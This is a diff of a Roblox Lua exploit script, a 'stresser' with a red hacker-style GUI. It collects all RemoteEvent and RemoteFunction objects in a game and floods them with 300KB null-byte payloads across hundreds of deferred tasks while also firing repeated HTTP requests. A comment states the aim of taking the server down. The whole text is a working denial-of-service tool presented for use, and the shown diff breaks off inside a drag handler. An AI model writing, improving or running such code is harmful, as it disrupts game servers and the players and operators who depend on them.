@@ -1,141 +1,130 @@
--- [[ BEAST TERMINATOR: ULTIMATE CYBER VISUAL ]] --
+-- [[ BEAST TERMINATOR: AUTO-MAX HYBRID STRESSER ]] --
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 
 local isFlooding = false
-local intensity = 100
-local payload = string.rep("\0", 150000)
+local autoIntensity = 250 -- Nilai optimal untuk mematikan server tanpa membuat HP crash
+local payload = string.rep("\0", 300000) -- 300KB Null-Data
 
--- [[ UI CONSTRUCTION ]] --
+-- [[ UI CONSTRUCTION: CLEAN & DEADLY ]] --
 local ScreenGui = Instance.new("ScreenGui", CoreGui)
 local Main = Instance.new("Frame", ScreenGui)
-Main.Size = UDim2.new(0, 380, 0, 450)
-Main.Position = UDim2.new(0.5, -190, 0.3, 0)
-Main.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
+Main.Size = UDim2.new(0, 350, 0, 380)
+Main.Position = UDim2.new(0.5, -175, 0.3, 0)
+Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
 Main.Visible = false
 Instance.new("UICorner", Main)
-local MainStroke = Instance.new("UIStroke", Main)
-MainStroke.Color = Color3.fromRGB(255, 0, 0)
-MainStroke.Thickness = 2
+local Stroke = Instance.new("UIStroke", Main)
+Stroke.Color = Color3.fromRGB(255, 0, 0)
+Stroke.Thickness = 3
 
--- [[ ANIMATED TERMINAL MONITOR ]] --
+-- [[ MONITOR TERMINAL ]] --
 local Monitor = Instance.new("Frame", Main)
-Monitor.Size = UDim2.new(0.92, 0, 0, 140)
-Monitor.Position = UDim2.new(0.04, 0, 0.05, 0)
+Monitor.Size = UDim2.new(0.9, 0, 0, 160)
+Monitor.Position = UDim2.new(0.05, 0, 0.05, 0)
 Monitor.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
 Instance.new("UICorner", Monitor)
-Instance.new("UIStroke", Monitor).Color = Color3.fromRGB(100, 0, 0)
 
 local ConsoleTxt = Instance.new("TextLabel", Monitor)
-ConsoleTxt.Size = UDim2.new(1, -20, 1, -30)
+ConsoleTxt.Size = UDim2.new(1, -20, 1, -20)
 ConsoleTxt.Position = UDim2.new(0, 10, 0, 10)
 ConsoleTxt.BackgroundTransparency = 1
-ConsoleTxt.Text = "> SYSTEM_READY\n> BYPASS_NETWORK: ACTIVE\n> WAITING_FOR_USER_INPUT..."
+ConsoleTxt.Text = "> PHANTOM_OS: READY\n> SCANNING REMOTES...\n> STATUS: STANDBY"
 ConsoleTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
 ConsoleTxt.Font = Enum.Font.Code
 ConsoleTxt.TextSize = 11
 ConsoleTxt.TextXAlignment = Enum.TextXAlignment.Left
 ConsoleTxt.TextYAlignment = Enum.TextYAlignment.Top
 
--- LOADING BAR ANIMATION
+-- PROGRESS BAR
 local BarBack = Instance.new("Frame", Monitor)
-BarBack.Size = UDim2.new(0.9, 0, 0, 6)
-BarBack.Position = UDim2.new(0.05, 0, 0.85, 0)
-BarBack.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
-Instance.new("UICorner", BarBack)
-
+BarBack.Size = UDim2.new(1, 0, 0, 4)
+BarBack.Position = UDim2.new(0, 0, 1, -4)
+BarBack.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
 local BarFill = Instance.new("Frame", BarBack)
 BarFill.Size = UDim2.new(0, 0, 1, 0)
 BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Instance.new("UICorner", BarFill)
 
--- [[ LOGIKA ANIMASI LOOP ]] --
+-- [[ BRUTAL ENGINE ]] --
+local function runTerminator()
+    local remotes = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            table.insert(remotes, v)
+        end
+    end
+
+    task.spawn(function()
+        while isFlooding do
+            for i = 1, autoIntensity do
+                task.defer(function()
+                    pcall(function()
+                        -- HTTP Flood
+                        HttpService:GetAsync("https://google.com/gen_204?id=" .. tick())
+                        -- Remote Hybrid Flood
+                        for r = 1, #remotes do
+                            local target = remotes[r]
+                            if target:IsA("RemoteEvent") then
+                                target:FireServer(payload, payload)
+                            elseif target:IsA("RemoteFunction") then
+                                task.spawn(function() target:InvokeServer(payload) end)
+                            end
+                        end
+                    end)
+                end)
+            end
+            task.wait(0.08)
+        end
+    end)
+end
+
+-- [[ ANIMATION LOOP ]] --
 task.spawn(function()
-    local spinner = {"|", "/", "-", "\\"}
+    local frames = {"▖", "▘", "▝", "▗"}
     local step = 0
     while true do
         if isFlooding then
             step = step + 1
-            local char = spinner[step % #spinner + 1]
-            local packetID = math.random(1000, 9999)
-            
             ConsoleTxt.Text = string.format(
-                "> EXECUTING_TERMINAL %s\n> INJECTING_NULL_DATA: #%d\n> LOAD_INTENSITY: %d%%\n> PACKET_STATUS: SENDING...",
-                char, packetID, math.min(intensity/10, 100)
+                "> EXECUTING AUTO_STRESSER %s\n> INJECTING: %d THREADS\n> DATA_RATE: MAX\n> STATUS: SERVER_TIMEOUT",
+                frames[step % #frames + 1], autoIntensity
             )
-            
-            -- Animate Bar Fill
-            BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.5)
-            task.wait(0.5)
+            BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.6)
+            task.wait(0.6)
             BarFill.Size = UDim2.new(0, 0, 1, 0)
         else
-            ConsoleTxt.Text = "> SYSTEM_IDLE\n> READY_TO_TERMINATE\n> ENCRYPTION: SECURE"
-            BarFill.Size = UDim2.new(0, 0, 1, 0)
+            ConsoleTxt.Text = "> PHANTOM_OS: ONLINE\n> PROTECTION: ENCRYPTED\n> STANDBY..."
             task.wait(0.5)
         end
     end
 end)
 
--- [[ INPUT & EXECUTION ]] --
-local InputBox = Instance.new("TextBox", Main)
-InputBox.Size = UDim2.new(0.92, 0, 0, 50)
-InputBox.Position = UDim2.new(0.04, 0, 0.42, 0)
-InputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-InputBox.Text = "200"
-InputBox.PlaceholderText = "THREADS (1-1000)"
-InputBox.TextColor3 = Color3.new(1,1,1)
-InputBox.Font = Enum.Font.GothamBold
-Instance.new("UICorner", InputBox)
-
+-- [[ MAIN BUTTON ]] --
 local StartBtn = Instance.new("TextButton", Main)
-StartBtn.Size = UDim2.new(0.92, 0, 0, 70)
-StartBtn.Position = UDim2.new(0.04, 0, 0.58, 0)
+StartBtn.Size = UDim2.new(0.9, 0, 0, 100)
+StartBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
 StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-StartBtn.Text = "INITIALIZE SHUTDOWN"
+StartBtn.Text = "EXECUTE TERMINATE"
 StartBtn.TextColor3 = Color3.new(1,1,1)
 StartBtn.Font = Enum.Font.GothamBold
-StartBtn.TextSize = 16
+StartBtn.TextSize = 22
 Instance.new("UICorner", StartBtn)
-local btnStroke = Instance.new("UIStroke", StartBtn)
-btnStroke.Color = Color3.fromRGB(255, 255, 255)
-btnStroke.Transparency = 0.8
 
--- ATTACK ENGINE
 StartBtn.MouseButton1Click:Connect(function()
     isFlooding = not isFlooding
     if isFlooding then
-        intensity = tonumber(InputBox.Text) or 200
-        StartBtn.Text = "STOP_EXECUTION"
+        StartBtn.Text = "STOPPING..."
         StartBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        
-        -- Start Attack Logic
-        local remotes = {}
-        for _, v in pairs(game:GetDescendants()) do
-            if v:IsA("RemoteEvent") then table.insert(remotes, v) end
-        end
-
-        task.spawn(function()
-            while isFlooding do
-                for i = 1, intensity do
-                    task.defer(function()
-                        pcall(function()
-                            HttpService:GetAsync("https://google.com/gen_204?z=" .. tick())
-                            for _, r in pairs(remotes) do r:FireServer(payload) end
-                        end)
-                    end)
-                end
-                task.wait(0.08)
-            end
-        end)
+        runTerminator()
     else
-        StartBtn.Text = "INITIALIZE SHUTDOWN"
+        StartBtn.Text = "EXECUTE TERMINATE"
         StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
     end
 end)
 
--- [[ DRAG & ICON ]] --
+-- [[ ICON & DRAG ]] --
 local Icon = Instance.new("ImageButton", ScreenGui)
 Icon.Size = UDim2.new(0, 60, 0, 60)
 Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
@@ -145,7 +134,6 @@ Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
 Instance.new("UIStroke", Icon).Color = Color3.fromRGB(255, 0, 0)
 
 Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
-
 local function drag(o)
     local s, i, sp
     o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
